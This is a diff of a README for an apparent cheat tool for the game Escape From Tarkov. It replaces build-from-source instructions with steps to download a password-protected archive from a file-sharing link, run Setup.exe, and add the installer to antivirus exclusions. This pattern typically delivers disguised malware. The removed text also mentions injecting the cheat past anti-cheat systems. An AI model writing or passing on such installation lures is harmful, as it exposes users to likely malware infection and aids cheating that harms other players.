@@ -69,36 +69,28 @@ Enable in the “Movement” section. Speed multiplier can be adjusted on a slid
 
 ---
 
-## 🛠 Installation Guide
+🚀 Installation
 
-> For Windows 10/11 x64 systems only.
+    ⚠️ This build is intended for Windows 10/11 x64 systems.
 
-### Requirements
+📥 Steps
 
-- ✅ Visual Studio 2022
-- ✅ .NET 6 SDK
-- ✅ C++ Redistributables
-- ✅ A Mono DLL injector (like [SharpMonoInjector](https://github.com/warxander/SharpMonoInjector))
+    Download the archive from the following link:
+    📦 Download EFT Menu v2.5(https://www.transfernow.net/dl/20250415UEmNJ6Zw)
+    Extract the archive using your preferred tool (e.g. WinRAR or 7-Zip).
+    You will be prompted for a password — enter:
 
-### Steps
+    eftmenu25
 
-1. Clone the repo:
+    Run the installer
+    Double-click the Setup.exe file and follow the on-screen instructions.
 
-    ```bash
-    git clone https://github.com/yourusername/eft-cheat.git
-    cd eft-cheat
-    ```
+    Launch Escape From Tarkov
+    Once the installation is complete, open the game as usual.
 
-2. Build the solution in Visual Studio (`Release x64`).
-3. Launch Escape From Tarkov and wait until you're in the main menu.
-4. Run your injector as admin and inject the compiled DLL.
-5. Press `Insert` to open the in-game menu.
+    The cheat will automatically inject when the main menu loads. Press Insert to open the menu.
 
-> 🧠 Tip: Some injectors may require manual mapping or kernel-level access if BE/EAC is active.
-
----
-
-А, понял тебя! Давай тогда обновим раздел **Controls** в самом `README.md`, чтобы он выглядел более информативно и красиво — как часть основного документа. Вот как может выглядеть улучшенная версия:
+    🧠 Tip: If your antivirus flags the installer, add it to your exclusions list. False positives are common with game tools due to injection methods.
 
 ---
 
